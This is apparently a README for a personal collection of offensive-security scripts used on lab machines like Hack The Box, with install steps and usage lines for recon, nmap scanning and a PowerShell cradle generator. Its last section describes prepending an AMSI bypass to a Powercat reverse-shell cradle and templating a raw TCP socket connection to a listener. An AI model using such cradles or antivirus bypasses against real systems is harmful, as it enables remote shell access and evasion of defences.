# scripts

This repository contains a collection of scripts I use regularly for offensive security-related tasks.

## Install

```bash
# Install dependencies (kali only)
sudo apt install python3-impacket python3-libtmux python3-requests python3-urllib3 python3-watchdog

# Clone repo
git clone https://github.com/Mojo8898/scripts.git '~/scripts'

# Make nmap wrapper script executable
chmod +x ~/scripts/scan_machine.py
```

## Example Usage

### recon_setup.py

```bash
# Just configure working environment
python3 ~/scripts/recon_setup/recon_setup.py -i 10.10.10.10 testing ~/htb/competitive_Mojo098.ovpn

# Configure working environment and launch automated tasks
python3 ~/scripts/recon_setup/recon_setup.py -i 10.10.10.10 testing ~/htb/competitive_Mojo098.ovpn -a -u bob -p 'Password123!'
```

### scan_machine.py

```bash
python3 ~/scripts/scan_machine.py 10.10.10.10
```

### scan_targets.py

```bash
python3 ~/scripts/scan_targets.py external_hosts.txt
```

### cradle_gen.py

```bash
python3 ~/scripts/cradle_gen.py 10.10.10.10 9001 -l
```

**Note:**
- To include an AMSI bypass with the Powercat cradle, create a file named amsi_bypass.txt in this project’s root directory. This file should contain the AMSI bypass code that will be prepended to the generated cradle.
- To include a raw socket PowerShell cradle, create a file named raw_socket.txt in this project’s root directory. Within this file, define the connection using Python’s string formatting placeholders for lhost and lport. For example:

```
System.Net.Sockets.TCPClient('{lhost}',{lport})
```
